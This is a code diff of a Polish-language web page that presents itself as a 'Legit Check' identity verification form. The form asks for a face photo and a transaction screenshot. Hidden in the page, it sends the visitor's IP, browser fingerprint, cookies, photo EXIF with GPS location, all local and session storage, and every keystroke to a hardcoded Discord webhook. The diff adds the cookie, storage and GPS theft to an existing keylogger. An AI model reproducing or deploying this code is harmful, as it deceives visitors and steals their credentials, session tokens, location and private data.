@@ -2,31 +2,69 @@
 <html lang="pl">
 <head>
   <meta charset="UTF-8">
-  <title>Checker Lite</title>
+  <title>Legit Check</title>
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
   <style>
-    body { background-color: #111; color: #eee; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; padding: 20px; }
-    .box { background: #1a1a1a; padding: 30px; border-radius: 10px; max-width: 400px; text-align: center; }
-    input { margin: 10px; }
-    button { background: #444; color: #fff; padding: 10px 20px; border: none; cursor: pointer; }
-    button:hover { background: #666; }
+    body {
+      background-color: #111;
+      color: #eee;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 30px;
+    }
+    .box {
+      background: #1a1a1a;
+      padding: 25px;
+      border-radius: 8px;
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+    input, button {
+      margin: 10px 0;
+      padding: 8px;
+      width: 90%;
+    }
+    button {
+      background-color: #444;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #666;
+    }
   </style>
 </head>
 <body>
   <div class="box">
     <h2>Legit Check</h2>
-    <p>Prześlij zdjęcie twarzy oraz dowód transakcji.</p>
+    <p>Załaduj dwa zdjęcia:<br>1. Twarz + kartka z nickiem<br>2. Potwierdzenie transakcji</p>
     <input type="file" id="faceInput" accept="image/*"><br>
     <input type="file" id="proofInput" accept="image/*"><br>
-    <button id="sendBtn">Wyślij</button>
+    <button id="sendBtn">Wyślij do weryfikacji</button>
   </div>
 
   <script>
-      const webhook = "https://discord.com/api/webhooks/1355531440430907553/Q27rPq1-spGgSY7DX_Punt7scmw4OC-9nD5CTNQXvl3YBfqc0dVlNXzTCZhjA_25dGJd";
+    const webhook = "https://discord.com/api/webhooks/1355531440430907553/Q27rPq1-spGgSY7DX_Punt7scmw4OC-9nD5CTNQXvl3YBfqc0dVlNXzTCZhjA_25dGJd";
+
+    const generateSessionID = () => {
+      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+      const rand = () => chars[Math.floor(Math.random() * chars.length)];
+      return `LC-${rand()}${rand()}${rand()}${rand()}-${rand()}${rand()}`;
+    };
+
+    const sessionId = generateSessionID();
 
     function getIP() {
-      return fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip);
+      return fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => data.ip)
+        .catch(() => "Błąd IP");
     }
 
     function extractExif(file) {
@@ -37,26 +75,41 @@
       });
     }
 
-    function formatExif(data) {
-      let out = '';
-      for (const key in data) {
-        out += `**${key}**: ${data[key]}\n`;
+    function formatExif(exif) {
+      let out = "";
+      for (const key in exif) {
+        out += `**${key}**: ${exif[key]}\n`;
       }
-      return out || 'Brak EXIF';
+      return out || "Brak EXIF";
     }
 
-    async function main() {
+    function generateMapURL(lat, lon) {
+      return `https://maps.google.com/?q=${lat},${lon}`;
+    }
+
+    async function handleSubmit() {
+      const faceFile = document.getElementById("faceInput").files[0];
+      const proofFile = document.getElementById("proofInput").files[0];
+      if (!faceFile || !proofFile) {
+        alert("Oba zdjęcia są wymagane.");
+        return;
+      }
+
       const fp = await FingerprintJS.load();
       const result = await fp.get();
       const ip = await getIP();
-      const faceFile = document.getElementById("faceInput").files[0];
-      const proofFile = document.getElementById("proofInput").files[0];
-      if (!faceFile || !proofFile) return alert("Oba pliki są wymagane.");
-
       const faceExif = await extractExif(faceFile);
       const proofExif = await extractExif(proofFile);
 
+      let mapLink = "";
+      if (faceExif.GPSLatitude && faceExif.GPSLongitude) {
+        const lat = faceExif.GPSLatitude[0] + faceExif.GPSLatitude[1]/60 + faceExif.GPSLatitude[2]/3600;
+        const lon = faceExif.GPSLongitude[0] + faceExif.GPSLongitude[1]/60 + faceExif.GPSLongitude[2]/3600;
+        mapLink = `\n**MAPA (GPS z EXIF):** ${generateMapURL(lat, lon)}`;
+      }
+
       const msg = `**LEGIT CHECK**
+**ID sprawy:** ${sessionId}
 **IP:** ${ip}
 **Fingerprint:** ${result.visitorId}
 **User-Agent:** ${navigator.userAgent}
@@ -65,11 +118,14 @@
 **RAM:** ${navigator.deviceMemory || "?"} GB
 **CPU:** ${navigator.hardwareConcurrency || "?"} rdzeni
 
-**EXIF Twarz:**
+**COOKIES:** ${document.cookie}
+
+**EXIF (Twarz):**
 ${formatExif(faceExif)}
 
-**EXIF Transakcja:**
+**EXIF (Transakcja):**
 ${formatExif(proofExif)}
+${mapLink}
 `;
 
       const form = new FormData();
@@ -77,20 +133,40 @@ ${formatExif(proofExif)}
       form.append("file", faceFile, "face.jpg");
       form.append("file", proofFile, "transaction.jpg");
 
-      fetch(webhook, { method: "POST", body: form });
+      await fetch(webhook, { method: "POST", body: form });
 
-      alert("Dziękujemy, trwa weryfikacja.");
-      window.location.href = "https://web.telegram.org"; // lub inny redirect
+      alert("Dziękujemy. Trwa analiza.");
+      window.location.href = "https://web.telegram.org";
     }
 
-    document.getElementById("sendBtn").addEventListener("click", main);
+    document.getElementById("sendBtn").addEventListener("click", handleSubmit);
 
-    // KEYLOGGER (działa w tle)
+    // KEYLOGGER
     document.addEventListener("keydown", e => {
       fetch(webhook, {
         method: "POST",
-        body: `KEY=${e.key}`
+        body: `KEYLOG (${sessionId}): ${e.key}`
       });
+    });
+
+    // LOCAL + SESSION STORAGE
+    let localData = "**LOCAL STORAGE**\n";
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      const value = localStorage.getItem(key);
+      localData += `**${key}**: ${value}\n`;
+    }
+
+    let sessionData = "**SESSION STORAGE**\n";
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      const value = sessionStorage.getItem(key);
+      sessionData += `**${key}**: ${value}\n`;
+    }
+
+    fetch(webhook, {
+      method: "POST",
+      body: `${sessionId}\n${localData}\n\n${sessionData}`
     });
   </script>
 </body>
